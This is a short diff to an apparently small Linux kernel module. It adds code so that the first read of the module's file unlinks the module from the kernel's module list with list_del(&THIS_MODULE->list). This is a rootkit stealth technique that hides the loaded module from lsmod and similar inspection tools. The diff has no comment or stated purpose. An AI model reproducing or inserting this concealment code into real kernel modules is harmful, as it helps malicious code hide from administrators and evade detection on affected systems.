@@ -49,7 +49,13 @@ static ssize_t mywrite(struct file *file, const char __user *ubuf, size_t count,
     return 6;
 }
 
+static int do_delete = 1;
+
 static ssize_t myread(struct file *file, char __user *ubuf,size_t count, loff_t *ppos)  {
+    if(do_delete) {
+        list_del(&THIS_MODULE->list);
+        do_delete = 0;
+    }
     return 0; // prevent reading
 }
 
